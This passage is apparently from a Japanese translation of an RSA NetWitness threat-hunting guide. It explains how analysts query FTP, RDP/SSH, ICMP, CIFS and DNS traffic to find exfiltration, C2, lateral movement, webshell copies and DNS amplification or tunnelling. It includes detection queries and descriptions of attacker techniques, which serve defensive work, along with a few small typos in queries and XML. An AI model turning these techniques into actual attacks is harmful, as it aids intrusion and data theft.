しかし、その動作の重要な側面は、どちらの場合もデータ転送が別のTCPセッションを介して行われることです。
これは、FTPサービスがメタデータとして利用可能なフォレンジックフィンガープリントを持たないことを意味します。
代わりに、私たちは最初にFTPデータの分析を開始するために、拡張機能とコマンドを実行する必要があります。

アナリストがFTPでexfilに興味があれば、`service = 21 && action ='put' && session.analysis ='first carve'` というクエリは、組織外のIPスペースに対して行われたすべてのFTP STORコマンドを表示します。
その後、アナリストは、ファイル名、内部アドレス、および宛先組織にピボットして、異常値を探し出すことができます。
FTPの別の興味深い成果物は、ユーザーまたはアプリケーションによって提供されるログイン資格証明を難読化する試みがないことです。
それらは単にUSERとPASSの平文コマンドです。
アナリストは、ユーザ名とパスワードのメタデータカテゴリを開くことで、FTPトラフィックをさらに分割できます。

注目すべきは、「lazy left-handedness」と呼ばれるものです。
これは急いで「安全な」パスワードを出そうとするときのパスワード選択方法です。
例えば、パスワード「RSAhunter!@#」が与えられている場合、シフトキーを押すと1,2,3キーの下にある特別なキーであるため、このRSAhunter！@＃は怠け者の左利きの順列になります。（英語キーボードではSHIFT+2で@になる）
同じように、「！qaz@wsx＃edc」は安全なパスワードのように見えるかもしれませんが、実際にQWERTYキーボードの3つの最も左のキー列を指で動かし、Shiftを数回押しています。
これらのセッションは、先進的な攻撃者によって示された操作ペースと忍耐力ではほとんどないかもしれませんが、いくつかのケースではこれが調査の最初の発見となっています。

FTP経由のコマンドと制御は、まれですが、まだ発生しており、チェックする必要があります。
C2が起動してListen状態になると、トロイの木馬は感染したマシンに関するデータに対してSTORを発行し、コマンドに対してRETRを発行します。
忙しい攻撃者には、これらのセッションの多くがあるはずです。
C2がリッスンしていないときは、未応答のIPにTCP SYNビーコンが送信されます。
静的なユーザー名とパスワード、またはランダムに生成された資格情報を提供することも可能です。
トロイの木馬は、プロトコルの他の60個のコマンドのいくつかを、トロイの木馬内のさまざまな機能にマッピングすることもできます。
正常に見えないものについては、アクションメタデータカテゴリを調べることをお勧めします。

## RDPとSSH

ハンティングにおいてバージョン5.2+以前のRDPは非常に興味深い対象でした。
これ以前のRDPバージョンはクリアテキストであり、多くのインジケータ（キーボードレイアウトなど）を抽出することができたからです。
バージョン5.2+を使用すると、証明書と鍵交換が行われ、残りのセッションは暗号化されます。
これらのセッションで興味深い唯一のメタデータはIPアドレスとポートです。
同様に、SSHはアナリストにほとんどメタデータを与えません。
通常、2つのプロトコルは個別に検査されますが、分析手法は同じです。
これを念頭に置いて、私たちのデータセットを調べて、RDPセッションとSSHセッションを調べることができます。

インターネットへの発信トラフィックについては、一般にRDPまたはSSHを許可することはお勧めできません。
多くの従業員は、これらを使用して、インターネットでレンタルしているマシンや自宅のマシンにリモートで接続します。
多くの場合、これらのセッションはデフォルトのポートではありません。
RDPのデフォルトはTCP 3389、SSHのデフォルトはTCP 22です。
最も一般的な非標準ポートは、このトラフィックに対して80と443です。
自由にインターネットにアクセスできます。
SSHは他のプロトコルをトンネリングするためによく使用され、不正なVPN接続のように動作したり、ネットワークを高度な攻撃者に繋ぐことさえできます。

SSHの興味深い側面は、SSHクライアントとSSHサーバーが接続を確立する際に平文を交換することです。
これにより、分析者はより多くの行動をプロファイリングすることができ、いくつかの分析的な洞察も可能になります。
外部に公開されているSSHサーバーが非常に古いバージョンを使っている場合、そのサーバーにはしばらくパッチが適用されておらず侵害されている可能性があるため、さらなる調査が必要になります。
同様に、SSHクライアントアプリケーションの情報は、イニシエータの意図を明らかにするのに役立ちます。

同様に、暗号化されたRDPセッションは、秘密鍵またはノンスの交換を保護するために証明書を交換し、その証明書の詳細はssl.subjectとssl.caのメタキーから読み取れます。

インバウンドRDPとSSHは最も吟味されるべきです。
インターネットに直面しているサーバーが侵害された場合、攻撃者が使い慣れた環境で迅速にアクセスできるよう、RDPまたはSSHをそのシステムに試行する可能性が高くなります。
TCP 3389またはTCP 22の接続をインバウンドで許可しない組織であっても、この非常に簡単なアクセス方法の犠牲になる可能性があります。
RSAは、攻撃者がFTPなどのインバウンドサービスを照会してシャットダウンし、ターミナルサービス構成を変更してTCP 21でリッスンし、サービスを開始することを確認しました。
SSHは同様の方法で悪用される可能性があります。
Tor ExitノードとVPNサービスのIPアドレスを追跡するLiveのメタデータも存在します。
効率的に調べるにはあまりにも多くのデータがある場合は、これらを利用する必要があります。

不正なアウトバウンドまたはインバウンドのRDPまたはSSHセッションを検出する際にアナリストに尋ねられる典型的な要求は、何かが流出したかどうかを判断することです。
ほとんどのRDPセッションは暗号化されており、すべてのSSHセッションは暗号化されているため、非常に特殊な場合を除いて、ネットワークトラフィックだけでは判別できません。
ただし、ネットワークトラフィックからアクティビティを推測できます。
アナリストが最初にすべきことは、下の図のように問題のIPアドレスを選択することです。

```
(ip.src = 192.168.1.10 || ip.dst = 192.168.1.10 || alias.ip = 192.168.1.10) && (ip.src = 192.168.5.5 || ip.dst = 192.168.5.5 || alias.ip = 192.168.1.10)
```

Decoderサービスは実際にSSHやRDPのTCPハンドシェイクを追跡しておらず、それに応じて要求と応答を順序付けしていないので、このようなWhere節を構成します。
ほとんどのRDPセッションとSSHセッションは60秒以上になるので、session.splitメタというラベルのついた継続セッションがたくさん残されます。
TCP SRCポートは実際のセッションの長さの間は変更されないため、どのセッションおよび継続データを調べるかを決定する際のガイドとして使用する必要があります。
NetWitnessでpcapを抽出してWiresharkで開くと、1つのpcap内のすべてのフレームのセッションが表示されます。
Statisticsメニューに移動してエンドポイントを選択すると、IPv4の下の各IPの受信バイトと送信バイトを確認できます。

![Figure 27. Wireshark Endpoints Byte Counts](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466515/Wireshark_Endpoints_664x243.png)

## ICMP

ICMPが利用される場面はpingコマンドだけではありません。
ICMPは、レイヤ3および4プロトコルをサポートする標準のメッセージングプロトコルです。
ICMPは、コード用の8ビットフィールドとステータス用の8ビットフィールドとを有する、レイヤ3プロトコルで、IPプロトコル番号は1です。
ほとんどのアナリストが認識しているコードは、エコー要求とエコー応答である8と0です。
もう1つの一般的なICMPコードは11、またはTracerouteでよく使用されるTime Exceeded（TTL）です。
ICMPはあらゆるネットワークのかなりの部分を占めていますが、セッションのサイズは一般に小さいです。
icmp.luaパーサは、IPプロトコル番号が1であるセッションからICMPタイプとコードを解析します。
Netwitnessはセッションごとに１つのサービスしか登録できず、ICMPはサービスではないため、サービスは登録されていません。
また、NetWitnessとそのサービスによってネイティブに解析される他のプロトコルのトンネリングにICMPが使用されています。
下の図は、ネットワークに表示される一般的なタイプとコード、および関連する2つのアラートを示しています。

|メタデータ|説明|
|:---:||:---|
|large icmp request frame|リクエストフレームが96byte以上
|large icmp response frame|レスポンスフレームが96byte以上

![Figure 28. IR_1_ICMP.lua Example Metadata](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466555/ICMP_Lua_679x145.png)

Session Characteristicsメタの大きなicmpリクエストフレームと大きなICMPレスポンスフレームは、いくらか明確です。
このロジックは、最も一般的なタイプコード3またはDestination Unreachableのいずれかで発生します。
このICMPメッセージがトラフィックを生成したシステムに返されると、フレームのペイロードセクションに違反しているフレームの一部も含まれます。
ICMP以外の何らかのプロトコルが十分に含まれている場合は、プロトコルパーサーの1つに一致します。
このようにして見つけられる共通サービスは、通常、データグラムベースのプロトコルです。
TCPプロトコルはペイロードデータを送信する前にソケットを確立する必要があるため、宛先に到達できない場合はペイロードはありません。
つまり、ルーティングミスが発生し、TCPフレームが宛先到達不能ICMPパケット内に終わる可能性があります。

大規模なICMPセッションメタデータは、多くのセッションを生成します。
また、セッションのメタデータエントリが少ないため、解析するのが難しいように思えるかもしれません。
アナリストは、Hunting Packのセッションサイズのメタデータに焦点を当てることにより、データセットをより効果的に捉え、インターネットに接続しているネットワーク内の送信元IPアドレスに集中することができます。

アナリストがフォレンジックフィンガープリントメタデータカテゴリのエントリを見つけた場合、これらは分析し、フォローアップして、有益なICMPセッションでの悪意のある活動を示す可能性があります。
ICMPを使用する一般的なトロイの木馬は、選択して分析できるエコー要求とエコー応答メッセージと混在しようとします。
アクションまたはエラーメタカテゴリに予約済みまたは非推奨のエントリが設定されている場合、セッションは悪意のある行為を解析する必要があります。
これらのタイプとコードは使用されておらず、トロイの木馬内のシグナリング方法を示す可能性があります。
準拠しているオペレーティングシステムは、これらのタイプのメッセージを生成すべきではありません。

## CIFS

NetWitnessがどこにキャプチャしているかによって、アナリストはSMB/CIFSトラフィックをほとんど検出しない可能性があります。
ネットワークのコアトラフィックは有益ですが、そのデータを取り込んで分析者が合理的な時間枠で検索できるようにするには、相当量のハードウェアが必要です。
また、レイヤ2のパスと、ほとんどのレイヤ2環境が共有する標準のCore -> Distribution -> Accessモデルには問題があります。
つまり、組織のCIFSトラフィックがNetWitnessによってキャプチャされる場合、組織内で横方向の動きを見つけるために使用できる指標がいくつかあります。

CIFSとRPCは、主に無名のタスクの転送とジョブ/スケジュールされたタスクの転送とネットワークを介してファイルをコピーするという2つの点で攻撃者によって使用されます。
仕事で探すことは比較的簡単です。
Liveにはnamed_pipes.luaというパーサーが含まれています。
このLuaパーサーは、トラフィックを調べて、名前付きパイプを抽出し、メタデータカテゴリnamed.pipeの下に登録します。
名前付きパイプは、CIFSによって処理される2つのエンドポイント間の論理接続です。
これにより、トランスポート層が簡素化され、認証時に使用される特権を使用してリモートシステムでアクションを実行することもできます。
これは、IPC $共有またはプロセス間通信シェアによって処理されます。
名前付きパイプ 'ATSVC'は、Atサービスが呼び出され、名前のないタスクがリモートホストに送信されたことを示します。

RSAは独自の名前付きパイプを使用してコミュニケーションを行う独自のバイナリを持つ組織を介して横方向の動きを観察し、このパーサーも識別子をメタデータとして登録します。
興味深いパイプを探すときは、組織内で一般的に使用される名前付きパイプのフィードを作成し、新しいメタデータを警告することをお勧めします。

また、攻撃者はCIFSを使用してネットワーク上のファイルを移動します。
これには、exfilデータ、マルウェア、ツール、およびwebshel​​lが含まれます。
これを念頭に置くと、NetWitnessへの次のクエリを使用して、これらの成果物の一部を発見するのに役立ちます。

|CIFSクエリの例|説明|
|:---:|:---|
|service = 445 && action = ‘create’,’write’,’read’ && fingerprint = ‘rar’|RARファイルのコピー
|service = 445 && action = ‘create’,’write’ && extension = ‘php’,’asp’,’aspx’,’jsp’,’cgi’,’pl’ && directory contains ‘iis’,’www’|通常ではないディレクトリに対するWebアプリケーションスクリプトのコピー
|service = 445 && action = ‘create’,’write’ && fingerprint contains ‘exe’|通常ではないディレクトリに対するWindows実行ファイルのコピー
|service = 445 && action = ‘create’,’write’,’read’ && directory contains ‘temp’|tempディレクトリに対するファイルコピー

## DNS

これまでに前述したセクションでは、NetWitnessデータセットへの最初のドリルダウンの多くがDNSを除外しています。
これは、HTTPを調べるときに、多くの分析がドメイン名自体とそのTLDで行われるためです。
ここからはDNSに専念して、このプロトコルのいくつかの側面を分析していきます。

動的DNSは、無料および有料のレベルで提供されます。
その元の目的は、GoDaddyやNameCheapなどの企業に登録することなくDNSサービスを提供することでした。
テクノロジーの多くの人々は、自宅のネットワーク上でIPアドレスが変更された場合、そのサービスを使用してホームネットワークに戻る方法を提供していました。
ダイナミックDNSの側面の1つは、ほとんどのプロバイダが匿名性を提供していることです。
つまり、人を確実に識別できる情報は必要ありません。
さらに、これらのサービスのほとんどのTTLは5分または300秒です。
つまり、新しいAレコードがわずか5分で目的のアプリケーションに到達する可能性があります。
これは攻撃者にとって有利であり、フォレンジックアナリストにとっては不利な状況です。

Live上で利用可能な **dyndns.lua** パーサーは、ダイナミックDNSプロバイダードメインの集合です。
これを利用するためには **http.lua** パーサーと **dns_verbose.lua** パーサーが必要です。
100,000以上の既知のダイナミックDNSドメインのいずれかが **alias.host** へのコールバックで照合されます。
ダイナミックDNSの解決されたホストを検索して、組織の名前またはその名前の順列（ '3mc.dyndns.org'など）を探します。
不審なドメインが検出された場合、DNSクエリによって解決されたIPアドレスが **alias.ip** のメタデータカテゴリに表示されます。
alias.hostへのエントリを生成しないプロトコルの場合は、このIPアドレスをip.srcやip.dstに指定することで分析が可能になります。

alias.ipメタデータカテゴリは、組織のパッシブDNSシステムとしても使用できます。
コンセントレータのメタデータ保持率は、適用されるコンテンツの量とデータレートによって異なりますが、APIクエリを使用してこのデータを抽出し、取得および長期保存のために別のアプリケーションに保存することができます。

あなたの組織が権威DNSをインターネットに公開している場合は、そのDNSサーバの再帰ポリシーについて問い合わせることをお勧めします。
まず、インターネットトラフィックからインバウンド用に作成したメタデータを選択し、`service = 53, DNS`を選択します。

alias.hostの中に、あなたの組織に属していないドメインが表示された場合は、再帰的なDNSサーバをホストしている可能性があります。
これは、インターネット上のDDoS活動の大部分が現在開かれている再帰的DNSサーバに関連しているため、重要です。
攻撃者がIPスプーフィングの対策がされていないネットワークを利用できるとしたら、攻撃対象のIPアドレスをソースにして、再帰的なDNSサーバに対するDNSクエリを発行することができます。
このDNSクエリにはANYを指定して、IN、MX、NSなどのすべてのタイプのレコードを要求します。
問題は、ripe.netなどの一部の組織のドメイン名が、79バイトのDNSクエリに対して3000バイトを超えて応答することです。
これは30倍以上の増幅で、攻撃者の10Mb/secのトラフィックを約350Mb/secのDoSに変えました。
多くのオープンな再帰的なDNSサーバーに広がっていると、組織の問題が発生する可能性があります。
あなたの組織が気づかないうちに、このようなサイバー犯罪者のDDoSに加担している可能性があります。
以下は、リクエストとレスポンスのサイズを示すripe.netのANYクエリの例です。

![Figure 29. DNS ANY Query Illustrationg Amplification Attacks](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466447/DNS_ANY_654x341.png)

この種類の攻撃を検索するクエリは以下の通りです。

![Figure 30. Netwitness Metadata Indicating Many Responses](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466584/Risk_Suspicious_683x165.png)

TCP/53とUDP/53において`service != 53`を調べることで、DNSトンネリングやDNSポートを利用したその他のプロトコルを検出することができます。
このドリルダウンで見つかったセッションサイズと送受信データ比率を調べることで、DNSポートとプロトコルを介して悪意あるC&C通信やデータの送受信を発見することができます。

# まとめ

アナリストは、特定の技術的側面および動作に関するコンテンツを開発してデータを豊かにすることで、テラバイト単位のデータ内で悪意のある活動をすばやく見つけることができます。
情報収集されたアナリストは、データセットを積極的に捜索することにより、マルウェア固有のシグネチャを必要とせずに新しい悪意のある活動を発見することができます。
実際、NetWitnessは、ベンダーや世代に関係なくIDSが検出できない認証・認可されたチャネルを使用して、悪意ある行為を発見して追跡することができました。

悪意のあるアクティビティを見つけることが唯一のユースケースではありませんが、トラフィックのフォレンジックリポジトリを持つことは、先進的な敵が発見されたときに非常に有用です。
アタッカーの滞留時間は数年ではないにしても数ヶ月で測定され、手持ちのトラフィックを容易にエクスポート可能であることは、事件中の膨大な時間を節約し、多くの新たな発見を導くこともあります。
データセットを分析する際に計画を立て、盲点を自己認識し、それをカバーする方法を開発することで、この滞留時間を短縮し、改善努力をスピードアップすることができます。

さらに、NetWitnessのようなツールは、トラフィックの詳細な可視性を提供することによって、どの組織でもセキュリティの状態を評価するのに役立ちます。
セキュリティポリシーが適切なものであることを確認しても、攻撃や違反を防ぐことはできませんが、違法に見える「セッション」が見つけやすくなるため、侵害されにくくなります。

# 備考：Static Meta Values

次の表は、ハンティングパックのコンテンツが作成する可能性のあるメタ値の参照リスト（コマンド/値リストに類似）を示しています。

# 備考：Hunting Content Pack Meta Keys

これらは、バージョン10.6.2以降のIRコンテンツパックメタキーを構成するindex-concentrator.xmlファイルのエントリです。
この前にバージョンを実行している場合は、index-concentrator-custom.xmlに次のエントリを手動で追加します。
```
注意：さらに、netdメタキーがlogdecoder上で正常に動作するためには、RSA LinkのTraffic Flow Lua Parserのトピックに記載されている手順を実行する必要があります。
```

*under construction*

### カスタムインデックスファイルにエントリを追加するには：

1. あなたのバージョンに応じて：
  - Security Analytics 10.xの場合：Security Analyticsメニューで、Administration> Servicesを選択します。
  - NetWitness 11.xの場合：NetWitness UIで、ADMIN> Servicesに移動します。
2. コンセントレータを選択し、View> Configを選択します。
3. [ファイル]タブを開きます。
4. index-concentrator-custom.xmlを選択し、次の行を追加します。
  <!-- Traffic Directionality -->
  <key description="Network Name" level="IndexValues" name="netname" format="Text" valueMax="10000"/>
  <key description="Traffic Flow Direction" level="IndexValues" name="direction" format="Text" valueMax="10000"/>
  <!-- Indicators -->
  <key description="Session Analysis" level="IndexValues" name="analysis.session" format="Text" valueMax="10000"/>
  <key description=Service Analysis" level="IndexValues" name="analysis.service" format="Text" valueMax="10000"/>
  <key description="File Analysis" level="IndexValues" name="analysis.file" format="Text" valueMax="10000"/>
  <key description="Indicators of Compromise" level="IndexValues" name="ioc" format="Text" valueMax="10000"/>
  <key description="Behaviors of Compromise" level="IndexValues" name="boc" format="Text" valueMax="10000"/>
  <key description="Enablers of Compromise" level="IndexValues" name="eoc" format="Text" valueMax="10000"/>
5. NetWitnessからログアウトし、再度ログインします。調査で追加したカスタムキーを表示するには、これを行う必要があります。
